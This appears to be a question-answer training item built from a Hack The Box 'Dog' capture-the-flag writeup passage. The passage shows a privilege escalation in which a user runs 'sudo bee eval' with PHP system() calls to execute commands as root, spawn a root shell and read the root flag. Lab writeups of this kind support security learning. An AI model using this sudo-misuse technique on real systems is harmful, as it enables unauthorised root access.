@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Explain the purpose and usage of the code/command in the following text: (Context: Writeup from Htb Dog Hacks Stuff)
+
+CONTEXT:
+Source: Htb Dog Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+--root /var/www/html ✘ 1 is not a valid directory. ⚠️ No Backdrop installation found. Run this command again from within a Backdrop installation, or use the '--root' global option. Exploit With this figured out, I can run PHP code: johncusack@dog:/var/www/html$ sudo bee eval 'system("id")' uid=0(root) gid=0(root) groups=0(root) Which is easy enough to get a shell as root: johncusack@dog:/var/www/html$ sudo bee eval 'system("bash")' root@dog:/var/www/html# And the flag: root@dog:~# cat root.txt 77b1553a************************
